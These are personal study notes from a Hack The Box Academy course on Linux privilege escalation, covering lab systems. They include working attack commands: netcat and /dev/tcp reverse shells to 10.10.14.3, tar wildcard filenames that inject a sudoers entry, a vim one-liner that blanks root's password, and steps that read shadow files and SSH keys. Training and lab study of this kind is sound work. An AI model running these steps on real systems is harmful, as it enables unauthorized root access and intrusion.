# Hack The Box academy Linux Privilege Escalation notes
## Introduction to Linux Privilege Escalation
### Short list
* basic things to check
  * OS version, kernel version, running services
* basic commands
  * ps aux | grep root (root processes)
  * ps au (similar than ps aux)
  * ls -la /, ls -la /home, ls -la /home/user1, ls -la /home/user1/.ssh
  * history, sudo -l, crontab -l, cat /etc/*cron*, ls -la /etc/*cron*
  * cat /etc/passwd, cat /etc/shadow
  * lsblk (Unmounted File Systems and Additional Drives)
  * setuid-, setgid permissions
  * writeable directories
    * find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
  * writeable files
    * find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
### some detailed info
* OS Version: Knowing the distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) will give you an idea of the types of tools that may be available. This would also identify the operating system version, for which there may be public exploits available.
* Kernel Version: As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version. Kernel exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.
* Running Services: Knowing what services are running on the host is important, especially those running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation. Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc. Public exploit PoCs exist for many of them, such as CVE-2016-9566, a local privilege escalation flaw in Nagios Core < 4.2.4.
## Environment Enumeration
* whoami, id, hostname, ifconfig (or ip a), sudo -l
* cat /etc/os-release (new or old linux system is used?) (if old, maybe it has known vulnerabilities)
* echo $PATH
* env
* uname -a (or cat /proc/version) (kernel version)
* lscpu (CPU type and version)
* cat /etc/shells (what shells are available?) (tmux and screen could be vulnerable!!)
* during enumeration we should note any defense system we found
  * e.g.: Exec Shield, iptables, AppArmor, SELinux, Fail2ban, Snort, Uncomplicated Firewall (ufw)
  * enumerating these systems not always works (because the lack of privileges)
  * but knowing them exist can help our strategy (not to test things that has extra defense...)
* lsblk (list hard disks, USB drives, optical drives, etc.)
* lpstat (printers)
* cat /etc/fstab (mounted and unmounted drives)
* route (or netstat -rn) (routing tables)
* /etc/resolv.conf (dns information) (important in domain environment !!!)
* arp -a
* cat /etc/passwd, cat /etc/shadow, cat /etc/group
* cat /etc/passwd | grep "*sh$" (users with shell)
  * some shell version is vulnerable (like bash v4.1 is vulnerable to shellshock)
* getent group group_name1 (lists members of a group)
* check the content of folders in home folders
* check configuration files
  * ends with .conf or .config
  * grep for usernames, passwords, credentials, secrets, ...
* if we found passwords we should try them for all users - maybe it will be working with one of them
* mounting and unmounting filesystems
  * by default it needs root priv to mount and umount file systems
    * for lateral movement the root access is the key to check everything to move on to the next system
* df -h (list mounted file systems)
* cat /etc/fstab | grep -v "#" | column -t (view unmounted file systems)
* find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep user1 (list all hidden files)
* find / -type d -name ".*" -ls 2>/dev/null (list all hidden directories)
* temporary directories
  * /tmp, /var/tmp
  * all users can read the contents of these folders (by default)
* ls -l /tmp /var/tmp /dev/shm (list temporary files)
## Linux Services & Internals Enumeration
### Internals
<pre>
# basic commands
ip a, ifconfig, cat /etc/hosts, history, ls -la /etc/cron.daily/
lastlog (ki mikor jelentkezett be)
who, finger (ki van most eppen bejelentkezve)

# finding history files
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
</pre>
The proc filesystem (proc / procfs) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is the primary way to access process information and can be used to view and modify kernel settings. It is virtual and does not exist as a real filesystem but is dynamically generated by the kernel. It can be used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.  
<pre>
# print proc information
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
</pre>
### Services
If it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability. However, current versions of Linux distributions can also have older packages or software installed that may have such vulnerabilities. Therefore, we will see a method to help us detect potentially dangerous packages in a bit. To do this, we first need to create a list of installed packages to work with.  
<pre>
# installed packages
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

# sudo version
sudo -V

# list binary files on the system
ls -l /bin /usr/bin/ /usr/sbin/

# list GTFO bins on the system
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

# trace system calls
strace ./file1

# check configuration files
# if a file has read permissions for everyone, we can still read the file even if we do not have permission to read the folder.
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

# find scripts on the system
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

# running services by user
# it a script created by the administrator in his path and whose rights have not been restricted, we can run it without going into the root directory.
ps aux | grep root
</pre>
## Credential Hunting
<pre>
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh
</pre>
## Path Abuse
Adding . to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as ls with a malicious script such as a reverse shell. If we add . to the path by issuing the command PATH=.:$PATH and then export PATH, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing ls will call the malicious script named ls in the current working directory instead of the binary located at /bin/ls).  
We modify the path to run a simple echo command when the command ls is typed
<pre> 
# print path env var
htb_student@NIX02:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

# add current working directory '.' to the path env var
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

# create local 'ls' command
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls

#calling ls will call the local ls instead of the standard ls command!
htb_student@NIX02:~$ ls
PATH ABUSE!!
</pre>
## Wildcard Abuse
An example of how wildcards can be abused for privilege escalation is the tar command, a common program for creating/extracting archives. If we look at the man page for the tar command, we see the following:  
<pre>
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
</pre>
The --checkpoint-action option permits an EXEC action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options. Let's see this in practice.  
Consider the following cron job, which is set up to back up the /home/htb-student directory's contents and create a compressed archive within /home/htb-student. The cron job is set to run every minute, so it is a good candidate for privilege escalation.  
<pre>
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
</pre>
We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.  
<pre>
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
</pre>
We can check and see that the necessary files were created.  
<pre>
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
</pre>
Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.  
<pre>
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
</pre>
## Escaping Restricted Shells
### Intro
* A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. Restricted shells are often used to provide a safe environment for users who may accidentally or intentionally damage the system or provide a way for users to access only certain system features. Some common examples of restricted shells include the rbash shell in Linux and the "Restricted-access Shell" in Windows.
* Common Restricted shells: Restricted Bourne shell (rbash), Restricted Korn shell (rksh), Restricted Z shell (rzsh)
### Escaping Techniques
#### Our own testing techniques
* base64 trick
  * on our attack machine we write the full command we want to run, and make a base64 code of it
  * on victim machine we echo the base64 code and chain it with base64 -d and put the whole thing to $()
  * it will decode the command and will be run it
  * we use only base64-d, the pipe (|) and the $() things (if these are enabled, we are good to go)
* using '**echo**' insted of **cat** and **ls**
<pre>
# list files in working directory with 'echo'
$ echo *
htb-user@ubuntu:~$ echo *
bin flag.txt

# list files in other directory (e.g. / directory)
htb-user@ubuntu:~$ echo /*
/bin /boot /cdrom /dev /etc /home /lib /lib32 /lib64 /libx32 /lost+found /media /mnt /opt /proc /root /run /sbin /snap /srv /sys /tmp /usr /var

# list files in arbit any other directory (e.g. /home directory)
htb-user@ubuntu:~$ echo /home/*
/home/htb-user /home/lab_adm

# print file content with 'echo' (relative path)
htb-user@ubuntu:~$ echo "$(&lt;flag.txt)"
HTB{35c4p3_7h3_r3stricted_5h311}

# print file content with 'echo' and 'pwd' (absolute path)
htb-user@ubuntu:~$ export TEST=$(pwd)/flag.txt
htb-user@ubuntu:~$ echo $TEST
/home/htb-user/flag.txt
htb-user@ubuntu:~$ echo "$(&lt;$TEST)"
HTB{35c4p3_7h3_r3stricted_5h311}

# print file content with 'echo' (absolute path)
htb-user@ubuntu:~$ export TEST=/etc/hosts
htb-user@ubuntu:~$ echo "$(&lt;$TEST)"
127.0.0.1 localhost
127.0.1.1 ubuntu
...
</pre>
#### Command injection
Imagine that we are in a restricted shell that allows us to execute commands by passing them as arguments to the ls command. Unfortunately, the shell only allows us to execute the ls command with a specific set of arguments, such as ls -l or ls -a, but it does not allow us to execute any other commands. In this situation, we can use command injection to escape from the shell by injecting additional commands into the argument of the ls command.  
For example, we could use the following command to inject a pwd command into the argument of the ls command:  
<pre>
mrFiSHER@htb[/htb]$ ls -l `pwd` 
</pre>
This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow us to execute the pwd command and see the current working directory, even though the shell does not allow us to execute the pwd command directly.  
#### Command Substitution
Another method for escaping from a restricted shell is to use command substitution. This involves using the shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.  
#### Command Chaining
In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.  
#### Environment Variables
For escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.  
#### Shell Functions
In some cases, it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.  
## Special Permissions
### source
https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits  
### setuid
The Set User ID upon Execution (setuid) permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The setuid bit appears as an s.  
It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. Many programs have additional features that can be leveraged to execute commands and, if the setuid bit is set on them, these can be used for our purpose.  
<pre>
 mrFiSHER@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-xr-x 1 root root 16728 Sep  1 19:06 /home/htb-student/shared_obj_hijack/payroll
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 /home/mrb3n/payroll
-rwSr--r-- 1 root root 0 Aug 31 02:51 /home/cliff.moore/netracer
-rwsr-xr-x 1 root root 40152 Nov 30  2017 /bin/mount
-rwsr-xr-x 1 root root 40128 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 27608 Nov 30  2017 /bin/umount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
...
</pre>
### setgid
The Set-Group-ID (setgid) permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command: find / -uid 0 -perm -6000 -type f 2>/dev/null. These files can be leveraged in the same manner as setuid binaries to escalate privileges.  
<pre>
 mrFiSHER@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine
</pre>
### GTFOBins
Source: https://gtfobins.github.io/  
The GTFOBins project is a curated list of binaries and scripts that can be used by an attacker to bypass security restrictions. Each page details the program's features that can be used to break out of restricted shells, escalate privileges, spawn reverse shell connections, and transfer files. For example, apt-get can be used to break out of restricted environments and spawn a shell by adding a Pre-Invoke command:  
<pre>
mrFiSHER@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
</pre>
## Sudo Rights Abuse
### Basic things
Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the sudo command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in /etc/sudoers. When landing on a system, we should always check to see if the current user has any sudo privileges by typing sudo -l. Sometimes we will need to know the user's password to list their sudo rights, but any rights entries with the NOPASSWD option can be seen without entering a password.  
**If relative path are given for commands in sudo file, that can be exploited with Path Abuse!!!!**  
* It can be replaced with another binary locally and that binary will be ran instead of the original!  
### Detailed description of privilege escalation with tcpdump binary
<pre>
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
</pre>
It is easy to misconfigure this. For example, a user may be granted root-level permissions without requiring a password. Or the permitted command line might be specified too loosely, allowing us to run a program in an unintended way, resulting is privilege escalation. For example, if the sudoers file is edited to grant a user the right to run a command such as tcpdump per the following entry in the sudoers file: (ALL) NOPASSWD: /usr/sbin/tcpdump an attacker could leverage this to take advantage of a the postrotate-command option.  
<pre>
htb_student@NIX02:~$ man tcpdump
...
-z postrorate-command
Used in conjunction with the -C or -G options, this will make `tcpdump` run " postrotate-command file " where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.
 ...
</pre>
By specifying the -z flag, an attacker could use tcpdump to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script .test containing a reverse shell and execute it as follows:  
<pre>
htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
</pre>
Let's try this out. First, make a file to execute with the postrotate-command, adding a simple reverse shell one-liner.  
<pre>
htb_student@NIX02:~$ cat /tmp/.test
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
</pre>
Next, start a netcat listener on our attacking box run tcpdump as root with the postrotate-command. If all goes to plan, we will receive a root reverse shell connection.  
<pre>
htb_student@NIX02:~$ sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

dropped privs to root
tcpdump: listening on ens192, link-type EN10MB (Ethernet), capture size 262144 bytes
Maximum file limit reached: 1
1 packet captured
6 packets received by filter
compress_savefile: execlp(/tmp/.test, /dev/null) failed: Permission denied
0 packets dropped by kernel
</pre>
We receive a root shell almost instantly.  
<pre>
mrFiSHER@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.2.12] 38938
bash: cannot set terminal process group (10797): Inappropriate ioctl for device
bash: no job control in this shell

root@NIX02:~# id && hostname               
id && hostname
uid=0(root) gid=0(root) groups=0(root)
NIX02
</pre>
## Privileged Groups
* LXC / LXD - Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at /mnt/root.
* Docker - Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers.
* Disk - Users within the disk group have full access to any devices contained within /dev, such as /dev/sda1, which is typically the main device used by the operating system. An attacker with these privileges can use debugfs to access the entire file system with root level privileges.
* ADM - Members of the adm group are able to read all logs stored in /var/log. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.
## Capabilities
### Basic info
Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted. This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.  
Setting capabilities involves using the appropriate tools and commands to assign specific capabilities to executables or programs. In Ubuntu, for example, we can use the setcap command to set capabilities for specific executables. This command allows us to specify the capability we want to set and the value we want to assign.  
### Set capability
For example, we could use the following command to set the cap_net_bind_service capability for an executable:  
<pre>
mrFiSHER@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
</pre>
When capabilities are set for a binary, it means that the binary will be able to perform specific actions that it would not be able to perform without the capabilities. For example, if the cap_net_bind_service capability is set for a binary, the binary will be able to bind to network ports, which is a privilege usually restricted.
<table>
<tr><td><b>Capability</b></td><td><b>Description</b></td></tr>
<tr><td>cap_sys_admin</td><td>Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.</td></tr>
<tr><td>cap_sys_chroot</td><td>Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.</td></tr>
<tr><td>cap_sys_ptrace</td><td>Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.</td></tr>
<tr><td>cap_sys_nice</td><td>Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.</td></tr>
<tr><td>cap_sys_time</td><td>Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.</td></tr>
<tr><td>cap_sys_resource</td><td>Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.</td></tr>
<tr><td>cap_sys_module</td><td>Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.</td></tr>
<tr><td>cap_net_bind_service</td><td>Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.</td></tr>
</table>
When using the setcap command to set capabilities for an executable in Linux, we need to specify the capability we want to set and the value we want to assign. The values we use will depend on the specific capability we are setting and the privileges we want to grant to the executable.  
Here are some examples of values that we can use with the setcap command, along with a brief description of what they do:  
<table>
<tr><td><b>Capability Values</b></td><td><b>Description</b></td></tr>
<tr><td>=</td><td>This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.</td></tr>
<tr><td>+ep</td><td>This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.</td></tr>
<tr><td>+ei</td><td>This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.</td></tr>
<tr><td>+p</td><td>This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.</td></tr>
</table>
Several Linux capabilities can be used to escalate a user's privileges to root, including:  
<table>
<tr><td><b>Capability</b></td><td><b>Desciption</b></td></tr>
<tr><td>cap_setuid</td><td>Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.</td></tr>
<tr><td>cap_setgid</td><td>Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.</td></tr>
<tr><td>cap_sys_admin</td><td>This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems.</td></tr>
<tr><td>cap_dac_override</td><td>Allows bypassing of file read, write, and execute permission checks.</td></tr>
</table>

### Enumerating Capabilities
It is important to note that these capabilities should be used with caution and only granted to trusted processes, as they can be misused to gain unauthorized access to the system. To enumerate all existing capabilities for all existing binary executables on a Linux system, we can use the following command:  
<pre>
mrFiSHER@htb[/htb]$ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

/usr/bin/vim.basic cap_dac_override=eip
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
</pre>
### Exploitation
If we gained access to the system with a low-privilege account, then discovered the dac_cap_override capability:  
<pre>
mrFiSHER@htb[/htb]$ getcap /usr/bin/vim.basic
/usr/bin/vim.basic cap_dac_override=eip
</pre>
For example, the /usr/bin/vim.basic binary is run without special privileges, such as with sudo. However, because the binary has the cap_dac_override capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the cap_dac_override capability and perform tasks that require this capability.  
Let us take a look at the /etc/passwd file where the user root is specified:  
<pre>
mrFiSHER@htb[/htb]$ cat /etc/passwd | head -n1
root:x:0:0:root:/root:/bin/bash
</pre>
We can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file:  
We need to press **:wq!** to save and quit !!!
<pre>
# after editing with vim press :wq! to save and quit!!!!
mrFiSHER@htb[/htb]$ /usr/bin/vim.basic /etc/passwd
</pre>
We also can make these changes in a non-interactive mode:  
<pre>
mrFiSHER@htb[/htb]$ echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
mrFiSHER@htb[/htb]$ cat /etc/passwd | head -n1
root::0:0:root:/root:/bin/bash
</pre>
Now, we can see that the x in that line is gone, which means that we can use the command su to log in as root without being asked for the password.  
## Vulnerable Services
Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer Screen. Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.  
* Screen link: https://linux.die.net/man/1/screen
<pre>
mrFiSHER@htb[/htb]$ screen -v
Screen version 4.05.00 (GNU) 10-Dec-16
</pre>
This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.

## Cron Job Abuse
Cron jobs can also be set run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The crontab command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in /var/spool/cron for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry 0 */12 * * * /home/admin/backup.sh would run every 12 hours.  

The root crontab is almost always only editable by the root user or a user with full sudo privileges; however, it can still be abused. You may find a world-writable script that runs as root and, even if you cannot read the crontab to know the exact schedule, you may be able to ascertain how often it runs (i.e., a backup script that creates a .tar.gz file every 12 hours). In this case, you can append a command onto the end of the script (such as a reverse shell one-liner), and it will execute the next time the cron job runs.  

Certain applications create cron files in the /etc/cron.d directory and may be misconfigured to allow a non-root user to edit them.  
### Examining Cron Jobs
First, let's look around the system for any writeable files or directories. The file backup.sh in the /dmz-backups directory is interesting and seems like it could be running on a cron job.  
<pre>
mrFiSHER@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>
</pre>
A quick look in the /dmz/backups directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration. Perhaps the sysadmin meant to specify every three hours like 0 */3 * * * but instead wrote */3 * * * *, which tells the cron job to run every three minutes. The second issue is that the backup.sh shell script is world writeable and runs as root.  
<pre>
mrFiSHER@htb[/htb]$ ls -la /dmz-backups/

total 36
drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..

-rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz
</pre>
We can confirm that a cron job is running using pspy, a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning procfs.  

Let's run pspy and have a look. The -pf flag tells the tool to print commands and file system events and -i 1000 tells it to scan profcs every 1000ms (or every second).  
<pre>
mrFiSHER@htb[/htb]$ ./pspy64 -pf -i 1000

From the above output, we can see that a cron job runs the backup.sh script located in the /dmz-backups directory and creating a tarball file of the contents of the /var/www/html directory.  

We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to ALWAYS take a copy of the script and/or create a backup of it. We should also attempt to append our commands to the end of the script to still run properly before executing our reverse shell command.  
### Original script
<pre>
mrFiSHER@htb[/htb]$ cat /dmz-backups/backup.sh 

#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
</pre>
### Modified script
<pre>
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-backups/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
 
bash -i >& /dev/tcp/10.10.14.3/443 0>&1
</pre>
We modify the script, stand up a local netcat listener, and wait. Sure enough, within three minutes, we have a root shell!
<pre>
mrFiSHER@htb[/htb]$ nc -lnvp 443

listening on [any] 443 ...

While not the most common attack, we do find poorly configured cron jobs that can be abused from time to time.
## LXD
See in **privesc_all_in_all/linux_privesc.md** file
## Docker
What can happen is that we get access to an environment where we will find users who can manage docker containers. With this, we could look for ways how to use those docker containers to obtain higher privileges on the target system. We can use several ways and techniques to escalate our privileges or escape the docker container.  
### Docker Shared Directories
Shared directories can be mounted as read-only or read-write, depending on specific administrator requirements. When mounted as read-only, modifications made within the container won't affect the host system, which is useful when read-only access is preferred to prevent accidental modifications.  
When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.  
<pre>
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
</pre>
From here on, we could copy the contents of the private SSH key to cry0l1t3.priv file and use it to log in as the user cry0l1t3 on the host system.  
<pre>
mrFiSHER@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
